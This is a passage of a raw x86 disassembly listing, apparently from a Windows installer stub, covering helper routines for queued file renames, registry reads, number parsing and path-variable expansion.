  405e61:	33 c0                	xor    %eax,%eax
  405e63:	5e                   	pop    %esi
  405e64:	5d                   	pop    %ebp
  405e65:	c2 0c 00             	ret    $0xc
  405e68:	55                   	push   %ebp
  405e69:	8b ec                	mov    %esp,%ebp
  405e6b:	56                   	push   %esi
  405e6c:	8b 75 10             	mov    0x10(%ebp),%esi
  405e6f:	8d 45 10             	lea    0x10(%ebp),%eax
  405e72:	6a 00                	push   $0x0
  405e74:	50                   	push   %eax
  405e75:	56                   	push   %esi
  405e76:	ff 75 0c             	push   0xc(%ebp)
  405e79:	ff 75 08             	push   0x8(%ebp)
  405e7c:	ff 15 90 80 40 00    	call   *0x408090
  405e82:	85 c0                	test   %eax,%eax
  405e84:	74 0a                	je     0x405e90
  405e86:	3b 75 10             	cmp    0x10(%ebp),%esi
  405e89:	75 05                	jne    0x405e90
  405e8b:	33 c0                	xor    %eax,%eax
  405e8d:	40                   	inc    %eax
  405e8e:	eb 02                	jmp    0x405e92
  405e90:	33 c0                	xor    %eax,%eax
  405e92:	5e                   	pop    %esi
  405e93:	5d                   	pop    %ebp
  405e94:	c2 0c 00             	ret    $0xc
  405e97:	53                   	push   %ebx
  405e98:	8b 1d 04 81 40 00    	mov    0x408104,%ebx
  405e9e:	55                   	push   %ebp
  405e9f:	56                   	push   %esi
  405ea0:	8b 74 24 14          	mov    0x14(%esp),%esi
  405ea4:	57                   	push   %edi
  405ea5:	85 f6                	test   %esi,%esi
  405ea7:	c7 05 e0 2a 42 00 4e 	movl   $0x4c554e,0x422ae0
  405eae:	55 4c 00 
  405eb1:	bf 00 04 00 00       	mov    $0x400,%edi
  405eb6:	bd e0 2a 42 00       	mov    $0x422ae0,%ebp
  405ebb:	74 26                	je     0x405ee3
  405ebd:	6a 01                	push   $0x1
  405ebf:	6a 00                	push   $0x0
  405ec1:	56                   	push   %esi
  405ec2:	e8 fa fe ff ff       	call   0x405dc1
  405ec7:	50                   	push   %eax
  405ec8:	ff 15 20 81 40 00    	call   *0x408120
  405ece:	57                   	push   %edi
  405ecf:	55                   	push   %ebp
  405ed0:	56                   	push   %esi
  405ed1:	ff d3                	call   *%ebx
  405ed3:	85 c0                	test   %eax,%eax
  405ed5:	0f 84 27 01 00 00    	je     0x406002
  405edb:	3b c7                	cmp    %edi,%eax
  405edd:	0f 8f 1f 01 00 00    	jg     0x406002
  405ee3:	be e0 2e 42 00       	mov    $0x422ee0,%esi
  405ee8:	57                   	push   %edi
  405ee9:	56                   	push   %esi
  405eea:	ff 74 24 1c          	push   0x1c(%esp)
  405eee:	ff d3                	call   *%ebx
  405ef0:	85 c0                	test   %eax,%eax
  405ef2:	0f 84 0a 01 00 00    	je     0x406002
  405ef8:	3b c7                	cmp    %edi,%eax
  405efa:	0f 8f 02 01 00 00    	jg     0x406002
  405f00:	56                   	push   %esi
  405f01:	55                   	push   %ebp
  405f02:	68 00 a4 40 00       	push   $0x40a400
  405f07:	68 e0 26 42 00       	push   $0x4226e0
  405f0c:	ff 15 34 82 40 00    	call   *0x408234
  405f12:	8b d8                	mov    %eax,%ebx
  405f14:	a1 54 47 42 00       	mov    0x424754,%eax
  405f19:	83 c4 10             	add    $0x10,%esp
  405f1c:	ff b0 28 01 00 00    	push   0x128(%eax)
  405f22:	56                   	push   %esi
  405f23:	e8 93 03 00 00       	call   0x4062bb
  405f28:	6a 04                	push   $0x4
  405f2a:	68 00 00 00 c0       	push   $0xc0000000
  405f2f:	56                   	push   %esi
  405f30:	e8 8c fe ff ff       	call   0x405dc1
  405f35:	8b e8                	mov    %eax,%ebp
  405f37:	83 fd ff             	cmp    $0xffffffff,%ebp
  405f3a:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  405f3e:	0f 84 be 00 00 00    	je     0x406002
  405f44:	6a 00                	push   $0x0
  405f46:	55                   	push   %ebp
  405f47:	ff 15 e0 80 40 00    	call   *0x4080e0
  405f4d:	8b f8                	mov    %eax,%edi
  405f4f:	8d 44 1f 0a          	lea    0xa(%edi,%ebx,1),%eax
  405f53:	50                   	push   %eax
  405f54:	6a 40                	push   $0x40
  405f56:	ff 15 28 81 40 00    	call   *0x408128
  405f5c:	8b f0                	mov    %eax,%esi
  405f5e:	85 f6                	test   %esi,%esi
  405f60:	0f 84 95 00 00 00    	je     0x405ffb
  405f66:	57                   	push   %edi
  405f67:	56                   	push   %esi
  405f68:	55                   	push   %ebp
  405f69:	e8 cb fe ff ff       	call   0x405e39
  405f6e:	85 c0                	test   %eax,%eax
  405f70:	0f 84 85 00 00 00    	je     0x405ffb
  405f76:	68 f4 a3 40 00       	push   $0x40a3f4
  405f7b:	56                   	push   %esi
  405f7c:	e8 a5 fd ff ff       	call   0x405d26
  405f81:	85 c0                	test   %eax,%eax
  405f83:	75 14                	jne    0x405f99
  405f85:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  405f88:	68 f4 a3 40 00       	push   $0x40a3f4
  405f8d:	50                   	push   %eax
  405f8e:	ff 15 38 81 40 00    	call   *0x408138
  405f94:	83 c7 0a             	add    $0xa,%edi
  405f97:	eb 35                	jmp    0x405fce
  405f99:	83 c0 0a             	add    $0xa,%eax
  405f9c:	68 f0 a3 40 00       	push   $0x40a3f0
  405fa1:	50                   	push   %eax
  405fa2:	e8 7f fd ff ff       	call   0x405d26
  405fa7:	8b e8                	mov    %eax,%ebp
  405fa9:	85 ed                	test   %ebp,%ebp
  405fab:	74 1d                	je     0x405fca
  405fad:	8d 0c 3e             	lea    (%esi,%edi,1),%ecx
  405fb0:	8d 04 19             	lea    (%ecx,%ebx,1),%eax
  405fb3:	eb 06                	jmp    0x405fbb
  405fb5:	8a 11                	mov    (%ecx),%dl
  405fb7:	88 10                	mov    %dl,(%eax)
  405fb9:	48                   	dec    %eax
  405fba:	49                   	dec    %ecx
  405fbb:	3b cd                	cmp    %ebp,%ecx
  405fbd:	77 f6                	ja     0x405fb5
  405fbf:	2b ee                	sub    %esi,%ebp
  405fc1:	45                   	inc    %ebp
  405fc2:	8b c5                	mov    %ebp,%eax
  405fc4:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405fc8:	eb 06                	jmp    0x405fd0
  405fca:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  405fce:	8b c7                	mov    %edi,%eax
  405fd0:	53                   	push   %ebx
  405fd1:	03 c6                	add    %esi,%eax
  405fd3:	68 e0 26 42 00       	push   $0x4226e0
  405fd8:	50                   	push   %eax
  405fd9:	e8 9e fd ff ff       	call   0x405d7c
  405fde:	33 c0                	xor    %eax,%eax
  405fe0:	50                   	push   %eax
  405fe1:	50                   	push   %eax
  405fe2:	50                   	push   %eax
  405fe3:	55                   	push   %ebp
  405fe4:	ff 15 50 81 40 00    	call   *0x408150
  405fea:	03 fb                	add    %ebx,%edi
  405fec:	57                   	push   %edi
  405fed:	56                   	push   %esi
  405fee:	55                   	push   %ebp
  405fef:	e8 74 fe ff ff       	call   0x405e68
  405ff4:	56                   	push   %esi
  405ff5:	ff 15 24 81 40 00    	call   *0x408124
  405ffb:	55                   	push   %ebp
  405ffc:	ff 15 20 81 40 00    	call   *0x408120
  406002:	5f                   	pop    %edi
  406003:	5e                   	pop    %esi
  406004:	5d                   	pop    %ebp
  406005:	5b                   	pop    %ebx
  406006:	c3                   	ret
  406007:	6a 05                	push   $0x5
  406009:	ff 74 24 0c          	push   0xc(%esp)
  40600d:	ff 74 24 0c          	push   0xc(%esp)
  406011:	ff 15 84 80 40 00    	call   *0x408084
  406017:	85 c0                	test   %eax,%eax
  406019:	75 0f                	jne    0x40602a
  40601b:	ff 74 24 08          	push   0x8(%esp)
  40601f:	ff 74 24 08          	push   0x8(%esp)
  406023:	e8 6f fe ff ff       	call   0x405e97
  406028:	59                   	pop    %ecx
  406029:	59                   	pop    %ecx
  40602a:	ff 05 f0 47 42 00    	incl   0x4247f0
  406030:	c2 08 00             	ret    $0x8
  406033:	8b 15 4c 47 42 00    	mov    0x42474c,%edx
  406039:	53                   	push   %ebx
  40603a:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40603e:	57                   	push   %edi
  40603f:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406043:	f7 d2                	not    %edx
  406045:	8b 07                	mov    (%edi),%eax
  406047:	c1 ea 16             	shr    $0x16,%edx
  40604a:	81 e2 00 01 00 00    	and    $0x100,%edx
  406050:	a8 20                	test   $0x20,%al
  406052:	74 34                	je     0x406088
  406054:	f7 c3 00 00 00 60    	test   $0x60000000,%ebx
  40605a:	74 2c                	je     0x406088
  40605c:	8b cb                	mov    %ebx,%ecx
  40605e:	56                   	push   %esi
  40605f:	c1 e9 15             	shr    $0x15,%ecx
  406062:	be 00 03 00 00       	mov    $0x300,%esi
  406067:	23 ce                	and    %esi,%ecx
  406069:	3b ce                	cmp    %esi,%ecx
  40606b:	5e                   	pop    %esi
  40606c:	75 0a                	jne    0x406078
  40606e:	8b ca                	mov    %edx,%ecx
  406070:	f7 d1                	not    %ecx
  406072:	23 0d 10 48 42 00    	and    0x424810,%ecx
  406078:	80 e4 fe             	and    $0xfe,%ah
  40607b:	0b c1                	or     %ecx,%eax
  40607d:	80 e4 fd             	and    $0xfd,%ah
  406080:	81 e3 ff ff ff 9f    	and    $0x9fffffff,%ebx
  406086:	eb 0d                	jmp    0x406095
  406088:	a9 00 00 10 00       	test   $0x100000,%eax
  40608d:	74 06                	je     0x406095
  40608f:	0b 05 10 48 42 00    	or     0x424810,%eax
  406095:	8b c8                	mov    %eax,%ecx
  406097:	23 c2                	and    %edx,%eax
  406099:	81 e1 df ff ef ff    	and    $0xffefffdf,%ecx
  40609f:	f7 d8                	neg    %eax
  4060a1:	1b c0                	sbb    %eax,%eax
  4060a3:	89 0f                	mov    %ecx,(%edi)
  4060a5:	f7 d0                	not    %eax
  4060a7:	23 c3                	and    %ebx,%eax
  4060a9:	5f                   	pop    %edi
  4060aa:	5b                   	pop    %ebx
  4060ab:	c2 08 00             	ret    $0x8
  4060ae:	55                   	push   %ebp
  4060af:	8b ec                	mov    %esp,%ebp
  4060b1:	8d 45 10             	lea    0x10(%ebp),%eax
  4060b4:	50                   	push   %eax
  4060b5:	ff 75 08             	push   0x8(%ebp)
  4060b8:	e8 76 ff ff ff       	call   0x406033
  4060bd:	85 c0                	test   %eax,%eax
  4060bf:	75 05                	jne    0x4060c6
  4060c1:	6a 06                	push   $0x6
  4060c3:	58                   	pop    %eax
  4060c4:	eb 12                	jmp    0x4060d8
  4060c6:	ff 75 14             	push   0x14(%ebp)
  4060c9:	ff 75 10             	push   0x10(%ebp)
  4060cc:	6a 00                	push   $0x0
  4060ce:	ff 75 0c             	push   0xc(%ebp)
  4060d1:	50                   	push   %eax
  4060d2:	ff 15 2c 80 40 00    	call   *0x40802c
  4060d8:	5d                   	pop    %ebp
  4060d9:	c2 10 00             	ret    $0x10
  4060dc:	55                   	push   %ebp
  4060dd:	8b ec                	mov    %esp,%ebp
  4060df:	8d 45 10             	lea    0x10(%ebp),%eax
  4060e2:	50                   	push   %eax
  4060e3:	ff 75 08             	push   0x8(%ebp)
  4060e6:	e8 48 ff ff ff       	call   0x406033
  4060eb:	33 c9                	xor    %ecx,%ecx
  4060ed:	3b c1                	cmp    %ecx,%eax
  4060ef:	75 05                	jne    0x4060f6
  4060f1:	6a 06                	push   $0x6
  4060f3:	58                   	pop    %eax
  4060f4:	eb 15                	jmp    0x40610b
  4060f6:	51                   	push   %ecx
  4060f7:	ff 75 14             	push   0x14(%ebp)
  4060fa:	51                   	push   %ecx
  4060fb:	ff 75 10             	push   0x10(%ebp)
  4060fe:	51                   	push   %ecx
  4060ff:	51                   	push   %ecx
  406100:	51                   	push   %ecx
  406101:	ff 75 0c             	push   0xc(%ebp)
  406104:	50                   	push   %eax
  406105:	ff 15 00 80 40 00    	call   *0x408000
  40610b:	5d                   	pop    %ebp
  40610c:	c2 10 00             	ret    $0x10
  40610f:	55                   	push   %ebp
  406110:	8b ec                	mov    %esp,%ebp
  406112:	51                   	push   %ecx
  406113:	8d 45 18             	lea    0x18(%ebp),%eax
  406116:	56                   	push   %esi
  406117:	50                   	push   %eax
  406118:	8b 45 18             	mov    0x18(%ebp),%eax
  40611b:	f7 d8                	neg    %eax
  40611d:	1b c0                	sbb    %eax,%eax
  40611f:	c7 45 fc 00 04 00 00 	movl   $0x400,-0x4(%ebp)
  406126:	25 00 01 00 00       	and    $0x100,%eax
  40612b:	0d 19 00 02 00       	or     $0x20019,%eax
  406130:	50                   	push   %eax
  406131:	ff 75 0c             	push   0xc(%ebp)
  406134:	ff 75 08             	push   0x8(%ebp)
  406137:	e8 72 ff ff ff       	call   0x4060ae
  40613c:	8b 75 14             	mov    0x14(%ebp),%esi
  40613f:	85 c0                	test   %eax,%eax
  406141:	75 3b                	jne    0x40617e
  406143:	8d 45 fc             	lea    -0x4(%ebp),%eax
  406146:	57                   	push   %edi
  406147:	50                   	push   %eax
  406148:	8d 45 0c             	lea    0xc(%ebp),%eax
  40614b:	56                   	push   %esi
  40614c:	50                   	push   %eax
  40614d:	6a 00                	push   $0x0
  40614f:	ff 75 10             	push   0x10(%ebp)
  406152:	ff 75 18             	push   0x18(%ebp)
  406155:	ff 15 08 80 40 00    	call   *0x408008
  40615b:	ff 75 18             	push   0x18(%ebp)
  40615e:	8b f8                	mov    %eax,%edi
  406160:	ff 15 10 80 40 00    	call   *0x408010
  406166:	80 a6 ff 03 00 00 00 	andb   $0x0,0x3ff(%esi)
  40616d:	85 ff                	test   %edi,%edi
  40616f:	5f                   	pop    %edi
  406170:	75 0c                	jne    0x40617e
  406172:	83 7d 0c 01          	cmpl   $0x1,0xc(%ebp)
  406176:	74 09                	je     0x406181
  406178:	83 7d 0c 02          	cmpl   $0x2,0xc(%ebp)
  40617c:	74 03                	je     0x406181
  40617e:	80 26 00             	andb   $0x0,(%esi)
  406181:	5e                   	pop    %esi
  406182:	c9                   	leave
  406183:	c2 14 00             	ret    $0x14
  406186:	ff 74 24 08          	push   0x8(%esp)
  40618a:	68 ac 83 40 00       	push   $0x4083ac
  40618f:	ff 74 24 0c          	push   0xc(%esp)
  406193:	ff 15 34 82 40 00    	call   *0x408234
  406199:	83 c4 0c             	add    $0xc,%esp
  40619c:	c2 08 00             	ret    $0x8
  40619f:	55                   	push   %ebp
  4061a0:	8b ec                	mov    %esp,%ebp
  4061a2:	51                   	push   %ecx
  4061a3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4061a6:	53                   	push   %ebx
  4061a7:	56                   	push   %esi
  4061a8:	57                   	push   %edi
  4061a9:	33 ff                	xor    %edi,%edi
  4061ab:	80 39 2d             	cmpb   $0x2d,(%ecx)
  4061ae:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4061b5:	b0 0a                	mov    $0xa,%al
  4061b7:	b3 39                	mov    $0x39,%bl
  4061b9:	75 05                	jne    0x4061c0
  4061bb:	41                   	inc    %ecx
  4061bc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  4061c0:	80 39 30             	cmpb   $0x30,(%ecx)
  4061c3:	75 1c                	jne    0x4061e1
  4061c5:	41                   	inc    %ecx
  4061c6:	8a 11                	mov    (%ecx),%dl
  4061c8:	80 fa 30             	cmp    $0x30,%dl
  4061cb:	7c 09                	jl     0x4061d6
  4061cd:	80 fa 37             	cmp    $0x37,%dl
  4061d0:	7f 04                	jg     0x4061d6
  4061d2:	b0 08                	mov    $0x8,%al
  4061d4:	b3 37                	mov    $0x37,%bl
  4061d6:	80 e2 df             	and    $0xdf,%dl
  4061d9:	80 fa 58             	cmp    $0x58,%dl
  4061dc:	75 03                	jne    0x4061e1
  4061de:	b0 10                	mov    $0x10,%al
  4061e0:	41                   	inc    %ecx
  4061e1:	0f be 11             	movsbl (%ecx),%edx
  4061e4:	41                   	inc    %ecx
  4061e5:	83 fa 30             	cmp    $0x30,%edx
  4061e8:	7c 0c                	jl     0x4061f6
  4061ea:	0f be f3             	movsbl %bl,%esi
  4061ed:	3b d6                	cmp    %esi,%edx
  4061ef:	7f 05                	jg     0x4061f6
  4061f1:	83 ea 30             	sub    $0x30,%edx
  4061f4:	eb 19                	jmp    0x40620f
  4061f6:	3c 10                	cmp    $0x10,%al
  4061f8:	75 21                	jne    0x40621b
  4061fa:	8b f2                	mov    %edx,%esi
  4061fc:	83 e6 df             	and    $0xffffffdf,%esi
  4061ff:	83 fe 41             	cmp    $0x41,%esi
  406202:	7c 17                	jl     0x40621b
  406204:	83 fe 46             	cmp    $0x46,%esi
  406207:	7f 12                	jg     0x40621b
  406209:	83 e2 07             	and    $0x7,%edx
  40620c:	83 c2 09             	add    $0x9,%edx
  40620f:	0f be f0             	movsbl %al,%esi
  406212:	0f af f7             	imul   %edi,%esi
  406215:	03 f2                	add    %edx,%esi
  406217:	8b fe                	mov    %esi,%edi
  406219:	eb c6                	jmp    0x4061e1
  40621b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40621e:	0f af c7             	imul   %edi,%eax
  406221:	5f                   	pop    %edi
  406222:	5e                   	pop    %esi
  406223:	5b                   	pop    %ebx
  406224:	c9                   	leave
  406225:	c2 04 00             	ret    $0x4
  406228:	68 00 04 00 00       	push   $0x400
  40622d:	ff 74 24 0c          	push   0xc(%esp)
  406231:	ff 74 24 0c          	push   0xc(%esp)
  406235:	ff 15 ac 80 40 00    	call   *0x4080ac
  40623b:	c2 08 00             	ret    $0x8
  40623e:	ff 25 b8 80 40 00    	jmp    *0x4080b8
  406244:	ff 25 3c 81 40 00    	jmp    *0x40813c
  40624a:	33 c0                	xor    %eax,%eax
  40624c:	50                   	push   %eax
  40624d:	50                   	push   %eax
  40624e:	ff 74 24 14          	push   0x14(%esp)
  406252:	ff 74 24 14          	push   0x14(%esp)
  406256:	6a ff                	push   $0xffffffff
  406258:	ff 74 24 18          	push   0x18(%esp)
  40625c:	50                   	push   %eax
  40625d:	50                   	push   %eax
  40625e:	ff 15 80 80 40 00    	call   *0x408080
  406264:	c3                   	ret
  406265:	68 00 04 00 00       	push   $0x400
  40626a:	ff 74 24 08          	push   0x8(%esp)
  40626e:	ff 74 24 10          	push   0x10(%esp)
  406272:	e8 d3 ff ff ff       	call   0x40624a
  406277:	83 c4 0c             	add    $0xc,%esp
  40627a:	c3                   	ret
  40627b:	55                   	push   %ebp
  40627c:	8b ec                	mov    %esp,%ebp
  40627e:	81 ec 04 01 00 00    	sub    $0x104,%esp
  406284:	32 d2                	xor    %dl,%dl
  406286:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406289:	0f be c2             	movsbl %dl,%eax
  40628c:	66 0f be 0c 08       	movsbw (%eax,%ecx,1),%cx
  406291:	66 85 c9             	test   %cx,%cx
  406294:	66 89 8c 45 fc fe ff 	mov    %cx,-0x104(%ebp,%eax,2)
  40629b:	ff 
  40629c:	74 0b                	je     0x4062a9
  40629e:	fe c2                	inc    %dl
  4062a0:	79 e4                	jns    0x406286
  4062a2:	b8 05 40 00 80       	mov    $0x80004005,%eax
  4062a7:	c9                   	leave
  4062a8:	c3                   	ret
  4062a9:	ff 75 0c             	push   0xc(%ebp)
  4062ac:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  4062b2:	50                   	push   %eax
  4062b3:	ff 15 84 82 40 00    	call   *0x408284
  4062b9:	c9                   	leave
  4062ba:	c3                   	ret
  4062bb:	55                   	push   %ebp
  4062bc:	8b ec                	mov    %esp,%ebp
  4062be:	83 ec 18             	sub    $0x18,%esp
  4062c1:	8b 45 0c             	mov    0xc(%ebp),%eax
  4062c4:	85 c0                	test   %eax,%eax
  4062c6:	7d 11                	jge    0x4062d9
  4062c8:	8b 0d 1c 3f 42 00    	mov    0x423f1c,%ecx
  4062ce:	8d 04 85 04 00 00 00 	lea    0x4(,%eax,4),%eax
  4062d5:	2b c8                	sub    %eax,%ecx
  4062d7:	8b 01                	mov    (%ecx),%eax
  4062d9:	8b 0d 98 47 42 00    	mov    0x424798,%ecx
  4062df:	53                   	push   %ebx
  4062e0:	56                   	push   %esi
  4062e1:	57                   	push   %edi
  4062e2:	8d 1c 08             	lea    (%eax,%ecx,1),%ebx
  4062e5:	b8 e0 36 42 00       	mov    $0x4236e0,%eax
  4062ea:	39 45 08             	cmp    %eax,0x8(%ebp)
  4062ed:	8b f8                	mov    %eax,%edi
  4062ef:	0f 82 eb 01 00 00    	jb     0x4064e0
  4062f5:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4062f8:	2b c8                	sub    %eax,%ecx
  4062fa:	81 f9 00 08 00 00    	cmp    $0x800,%ecx
  406300:	0f 83 da 01 00 00    	jae    0x4064e0
  406306:	8b 7d 08             	mov    0x8(%ebp),%edi
  406309:	83 65 08 00          	andl   $0x0,0x8(%ebp)
  40630d:	e9 ce 01 00 00       	jmp    0x4064e0
  406312:	8b cf                	mov    %edi,%ecx
  406314:	2b c8                	sub    %eax,%ecx
  406316:	81 f9 00 04 00 00    	cmp    $0x400,%ecx
  40631c:	0f 8d c8 01 00 00    	jge    0x4064ea
  406322:	43                   	inc    %ebx
  406323:	80 fa 04             	cmp    $0x4,%dl
  406326:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  406329:	0f 83 a4 01 00 00    	jae    0x4064d3
  40632f:	0f be 43 01          	movsbl 0x1(%ebx),%eax
  406333:	0f be 0b             	movsbl (%ebx),%ecx
  406336:	8b f0                	mov    %eax,%esi
  406338:	8b d9                	mov    %ecx,%ebx
  40633a:	83 e6 7f             	and    $0x7f,%esi
  40633d:	83 e3 7f             	and    $0x7f,%ebx
  406340:	c1 e6 07             	shl    $0x7,%esi
  406343:	0b f3                	or     %ebx,%esi
  406345:	8b d9                	mov    %ecx,%ebx
  406347:	80 cf 80             	or     $0x80,%bh
  40634a:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  40634d:	89 5d e8             	mov    %ebx,-0x18(%ebp)
  406350:	8b d8                	mov    %eax,%ebx
  406352:	80 cf 80             	or     $0x80,%bh
  406355:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406358:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40635b:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  40635e:	43                   	inc    %ebx
  40635f:	43                   	inc    %ebx
  406360:	80 fa 02             	cmp    $0x2,%dl
  406363:	0f 85 17 01 00 00    	jne    0x406480
  406369:	a1 4c 47 42 00       	mov    0x42474c,%eax
  40636e:	6a 02                	push   $0x2
  406370:	85 c0                	test   %eax,%eax
  406372:	5e                   	pop    %esi
  406373:	79 18                	jns    0x40638d
  406375:	66 3d 04 5a          	cmp    $0x5a04,%ax
  406379:	74 12                	je     0x40638d
  40637b:	83 7d f4 23          	cmpl   $0x23,-0xc(%ebp)
  40637f:	74 0c                	je     0x40638d
  406381:	83 7d f4 2e          	cmpl   $0x2e,-0xc(%ebp)
  406385:	74 06                	je     0x40638d
  406387:	83 65 0c 00          	andl   $0x0,0xc(%ebp)
  40638b:	eb 07                	jmp    0x406394
  40638d:	c7 45 0c 01 00 00 00 	movl   $0x1,0xc(%ebp)
  406394:	83 3d e4 47 42 00 00 	cmpl   $0x0,0x4247e4
  40639b:	74 03                	je     0x4063a0
  40639d:	6a 04                	push   $0x4
  40639f:	5e                   	pop    %esi
  4063a0:	84 c9                	test   %cl,%cl
  4063a2:	79 37                	jns    0x4063db
  4063a4:	8b c1                	mov    %ecx,%eax
  4063a6:	83 e1 3f             	and    $0x3f,%ecx
  4063a9:	03 0d 98 47 42 00    	add    0x424798,%ecx
  4063af:	83 e0 40             	and    $0x40,%eax
  4063b2:	50                   	push   %eax
  4063b3:	57                   	push   %edi
  4063b4:	51                   	push   %ecx
  4063b5:	68 b0 83 40 00       	push   $0x4083b0
  4063ba:	68 02 00 00 80       	push   $0x80000002
  4063bf:	e8 4b fd ff ff       	call   0x40610f
  4063c4:	80 3f 00             	cmpb   $0x0,(%edi)
  4063c7:	0f 85 9a 00 00 00    	jne    0x406467
  4063cd:	ff 75 f4             	push   -0xc(%ebp)
  4063d0:	57                   	push   %edi
  4063d1:	e8 e5 fe ff ff       	call   0x4062bb
  4063d6:	e9 87 00 00 00       	jmp    0x406462
  4063db:	83 f9 25             	cmp    $0x25,%ecx
  4063de:	75 0e                	jne    0x4063ee
  4063e0:	68 00 04 00 00       	push   $0x400
  4063e5:	57                   	push   %edi
  4063e6:	ff 15 7c 80 40 00    	call   *0x40807c
  4063ec:	eb 74                	jmp    0x406462
  4063ee:	83 f9 24             	cmp    $0x24,%ecx
  4063f1:	75 6b                	jne    0x40645e
  4063f3:	68 00 04 00 00       	push   $0x400
  4063f8:	57                   	push   %edi
  4063f9:	ff 15 c4 80 40 00    	call   *0x4080c4
  4063ff:	33 f6                	xor    %esi,%esi
  406401:	eb 5b                	jmp    0x40645e
  406403:	a1 44 47 42 00       	mov    0x424744,%eax
  406408:	33 c9                	xor    %ecx,%ecx
  40640a:	4e                   	dec    %esi
  40640b:	3b c1                	cmp    %ecx,%eax
  40640d:	74 18                	je     0x406427
  40640f:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  406412:	74 13                	je     0x406427
  406414:	57                   	push   %edi
  406415:	51                   	push   %ecx
  406416:	51                   	push   %ecx
  406417:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  40641b:	ff 35 48 47 42 00    	push   0x424748
  406421:	ff d0                	call   *%eax
  406423:	85 c0                	test   %eax,%eax
  406425:	74 3b                	je     0x406462
  406427:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40642a:	50                   	push   %eax
  40642b:	ff 74 b5 e8          	push   -0x18(%ebp,%esi,4)
  40642f:	ff 35 48 47 42 00    	push   0x424748
  406435:	ff 15 7c 81 40 00    	call   *0x40817c
  40643b:	85 c0                	test   %eax,%eax
  40643d:	75 1c                	jne    0x40645b
  40643f:	57                   	push   %edi
  406440:	ff 75 fc             	push   -0x4(%ebp)
  406443:	ff 15 74 81 40 00    	call   *0x408174
  406449:	ff 75 fc             	push   -0x4(%ebp)
  40644c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40644f:	ff 15 94 82 40 00    	call   *0x408294
  406455:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406459:	75 07                	jne    0x406462
  40645b:	80 27 00             	andb   $0x0,(%edi)
  40645e:	85 f6                	test   %esi,%esi
  406460:	75 a1                	jne    0x406403
  406462:	80 3f 00             	cmpb   $0x0,(%edi)
  406465:	74 11                	je     0x406478
  406467:	83 7d f4 1a          	cmpl   $0x1a,-0xc(%ebp)
  40646b:	75 0b                	jne    0x406478
  40646d:	68 dc 83 40 00       	push   $0x4083dc
  406472:	57                   	push   %edi
  406473:	e8 cc fd ff ff       	call   0x406244
  406478:	57                   	push   %edi
  406479:	e8 85 00 00 00       	call   0x406503
  40647e:	eb 44                	jmp    0x4064c4
  406480:	80 fa 03             	cmp    $0x3,%dl
  406483:	75 2e                	jne    0x4064b3
  406485:	83 fe 1d             	cmp    $0x1d,%esi
  406488:	75 0e                	jne    0x406498
  40648a:	ff 35 48 47 42 00    	push   0x424748
  406490:	57                   	push   %edi
  406491:	e8 f0 fc ff ff       	call   0x406186
  406496:	eb 11                	jmp    0x4064a9
  406498:	8b c6                	mov    %esi,%eax
  40649a:	c1 e0 0a             	shl    $0xa,%eax
  40649d:	05 00 50 42 00       	add    $0x425000,%eax
  4064a2:	50                   	push   %eax
  4064a3:	57                   	push   %edi
  4064a4:	e8 7f fd ff ff       	call   0x406228
  4064a9:	83 c6 eb             	add    $0xffffffeb,%esi
  4064ac:	83 fe 07             	cmp    $0x7,%esi
  4064af:	73 13                	jae    0x4064c4
  4064b1:	eb c5                	jmp    0x406478
  4064b3:	80 fa 01             	cmp    $0x1,%dl
  4064b6:	75 0c                	jne    0x4064c4
  4064b8:	83 c8 ff             	or     $0xffffffff,%eax
  4064bb:	2b c6                	sub    %esi,%eax
  4064bd:	50                   	push   %eax
  4064be:	57                   	push   %edi
  4064bf:	e8 f7 fd ff ff       	call   0x4062bb
  4064c4:	57                   	push   %edi
  4064c5:	e8 74 fd ff ff       	call   0x40623e
  4064ca:	03 f8                	add    %eax,%edi
  4064cc:	b8 e0 36 42 00       	mov    $0x4236e0,%eax
  4064d1:	eb 0d                	jmp    0x4064e0
  4064d3:	75 08                	jne    0x4064dd
  4064d5:	8a 0b                	mov    (%ebx),%cl
  4064d7:	88 0f                	mov    %cl,(%edi)
  4064d9:	47                   	inc    %edi
  4064da:	43                   	inc    %ebx
  4064db:	eb 03                	jmp    0x4064e0
  4064dd:	88 17                	mov    %dl,(%edi)
  4064df:	47                   	inc    %edi
  4064e0:	8a 13                	mov    (%ebx),%dl
  4064e2:	84 d2                	test   %dl,%dl
  4064e4:	0f 85 28 fe ff ff    	jne    0x406312
  4064ea:	80 27 00             	andb   $0x0,(%edi)
  4064ed:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  4064f1:	5f                   	pop    %edi
  4064f2:	5e                   	pop    %esi
  4064f3:	5b                   	pop    %ebx
  4064f4:	74 09                	je     0x4064ff
  4064f6:	50                   	push   %eax
  4064f7:	ff 75 08             	push   0x8(%ebp)
  4064fa:	e8 29 fd ff ff       	call   0x406228
  4064ff:	c9                   	leave
  406500:	c2 08 00             	ret    $0x8
  406503:	53                   	push   %ebx
  406504:	56                   	push   %esi
  406505:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406509:	57                   	push   %edi
  40650a:	80 3e 5c             	cmpb   $0x5c,(%esi)
  40650d:	75 15                	jne    0x406524
  40650f:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  406513:	75 0f                	jne    0x406524
  406515:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  406519:	75 09                	jne    0x406524
